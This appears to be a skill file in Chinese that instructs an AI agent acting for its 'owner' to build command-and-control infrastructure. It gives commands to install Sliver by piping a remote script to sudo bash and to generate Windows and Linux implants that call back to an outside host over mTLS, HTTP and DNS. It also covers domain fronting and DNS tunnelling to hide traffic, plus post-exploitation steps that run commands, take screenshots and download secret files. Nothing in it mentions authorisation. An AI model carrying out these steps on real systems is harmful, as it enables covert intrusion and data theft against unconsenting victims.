---
name: m-c2
description: "C2 命令控制：Sliver 部署、生成 beacon、DNS 隧道、Domain Fronting、代理链、多协议回调。"
---

# m-c2 · 命令与控制

被读到时：主人要搭 C2、生成 implant、建隐蔽通道、做代理链。

## 首选工具：Sliver（12.3K★，2026-11 仍在更新）

```bash
# 安装（官方脚本，取最新版）
curl https://sliver.sh/install | sudo bash
sliver-server
# 生成 implant
> generate --mtls 1.2.3.4 --os windows --arch amd64 beacon
> generate --http 1.2.3.4 --os linux --arch amd64 session
> generate --dns 1.2.3.4 --os windows --arch amd64 beacon
# 监听
> mtls --lhost 0.0.0.0 --lport 8888
> http --lhost 0.0.0.0 --lport 443
```

## 二、协议选择

| 协议 | 隐蔽性 | 适用 |
|---|---|---|
| mTLS | 中 | 通用 |
| HTTP(S) | 中 | 过大多数出站限制 |
| DNS | 高 | 只放 DNS 的内网 |
| WireGuard | 中 | 点对点隧道 |

## 三、隐蔽通道

```bash
# Domain Fronting：请求头 Host 指向合法 CDN，SNI 指向真实 C2
# DNS 隧道：Sliver 自带 dns 模式，或 dnscat2
# 代理链：C2 前面挂多级跳板（chisel/ligolo-ng 转发）
```

## 四、后渗透

```bash
# Sliver 会话内
> use <session-id>
> upload /tmp/tool.exe
> execute -o cmd.exe /c whoami
> screenshot
> download C:\Users\...\secret.txt
```

## 五、验收

- beacon 回连成功（session 列表可见）
- 指令执行有回显
- 换协议（HTTP → DNS）还能连上

Sliver 是 BishopFox 维护，100+ 贡献者，v1.7.9（2026-10），活项目。Havoc / Mythic 是备选，也持续维护。
